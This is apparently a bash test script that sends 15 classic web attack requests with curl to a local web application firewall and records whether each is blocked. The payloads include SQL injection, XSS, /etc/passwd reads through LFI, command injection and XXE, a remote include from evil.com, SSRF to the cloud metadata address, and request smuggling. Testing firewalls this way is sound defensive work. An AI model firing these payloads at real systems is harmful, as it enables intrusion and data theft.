#!/bin/bash

TARGET="http://127.0.0.1:8080"
UA="WAF-Killer-Attacker"

echo "==========================================================================="
echo "🚀  LIVE ATTACK SIMULATION - WAF KILLER (CURL EDITION)"
echo "==========================================================================="
echo "Target: $TARGET"
printf "| %-32s | %-6s | %-20s | %-12s |\n" "ATTACK VECTOR" "STATUS" "RESULT" "INFO"
echo "|----------------------------------|--------|----------------------|--------------|"

run_test() {
    NAME="$1"
    CMD="$2"
    EXPECTED="${3:-403}"
    
    # Run curl, capture header and status
    # We use sh -c to handle complex commands if needed, or just eval
    # But here we will construct the command simply
    
    # We will run the command and capture output
    # We use a temporary file for headers
    
    eval "$CMD -s -D headers.tmp -o /dev/null -w '%{http_code}' > status.tmp"
    STATUS=$(cat status.tmp)
    
    if [ "$STATUS" -eq "$EXPECTED" ]; then
        RESULT="✅ BLOCKED"
    else
        RESULT="❌ ALLOWED ($STATUS)"
    fi
    
    SCORE=$(grep -i "x-waf-score" headers.tmp | awk '{print $2}' | tr -d '\r')
    printf "| %-32s | %-6s | %-20s | Score: %-5s |\n" "$NAME" "$STATUS" "$RESULT" "${SCORE:-N/A}"
    
    rm -f headers.tmp status.tmp
    sleep 0.1
}

# 1. SQLi
# q=' OR 1=1 --
run_test "1. SQL Injection (SQLi)" "curl '$TARGET/?q=%27%20OR%201=1%20--' -H 'User-Agent: $UA'"

# 2. XSS
# q=<script>alert(1)</script>
run_test "2. XSS" "curl '$TARGET/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E' -H 'User-Agent: $UA'"

# 3. LFI
# file=../../etc/passwd
run_test "3. LFI" "curl '$TARGET/?file=..%2F..%2Fetc%2Fpasswd' -H 'User-Agent: $UA'"

# 4. RFI
# file=http://evil.com/shell
run_test "4. RFI" "curl '$TARGET/?file=http%3A%2F%2Fevil.com%2Fshell' -H 'User-Agent: $UA'"

# 5. RCE
# cmd=;cat /etc/passwd
run_test "5. RCE / Command Injection" "curl '$TARGET/?cmd=%3Bcat%20%2Fetc%2Fpasswd' -H 'User-Agent: $UA'"

# 6. Path Traversal
# /../../etc/passwd (Needs --path-as-is)
run_test "6. Path Traversal (URI)" "curl --path-as-is '$TARGET/../../etc/passwd' -H 'User-Agent: $UA'"

# 7. SSRF
# url=http://169.254.169.254/latest/
run_test "7. SSRF" "curl '$TARGET/?url=http%3A%2F%2F169.254.169.254%2Flatest%2F' -H 'User-Agent: $UA'"

# 8. XXE
XML='<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
# We pass body via echo to avoid quote hell in arguments
run_test "8. XXE" "echo '$XML' | curl -X POST -H 'Content-Type: application/xml' -H 'User-Agent: $UA' -d @- '$TARGET/'"

# 9. CSRF
# amount=100
run_test "9. CSRF (Missing Token)" "curl -X POST '$TARGET/transfer' -H 'Cookie: session=admin' -H 'User-Agent: $UA' -d 'amount=100'"

# 10. Request Smuggling (Mock)
run_test "10. Request Smuggling" "curl -X POST -H 'Transfer-Encoding: chunked' -H 'Content-Length: 5' -d '0' -H 'User-Agent: $UA' '$TARGET/'"

# 11. Protocol Violation (Bad Host)
run_test "11. Protocol Violation" "curl -H 'Host: ' -H 'User-Agent: $UA' '$TARGET/'"

# 12. App Layer DoS
# Large payload
run_test "12. Application Layer DoS" "curl '$TARGET/?a=$(printf 'A%.0s' {1..5000})' -H 'User-Agent: $UA'"

# 13. Credential Stuffing
JSON='{"u":"admin","p":"123456"}'
run_test "13. Credential Stuffing" "echo '$JSON' | curl -X POST '$TARGET/login' -H 'Content-Type: application/json' -H 'User-Agent: $UA' -d @-"

# 14. IDOR
run_test "14. IDOR (Anomaly)" "curl '$TARGET/user/1001' -H 'User-Agent: $UA'"

# 15. Bot Traffic
run_test "15. Bot / Scraper" "curl -H 'User-Agent: curl/7.64.1' '$TARGET/'"

echo "==========================================================================="
echo "Done."
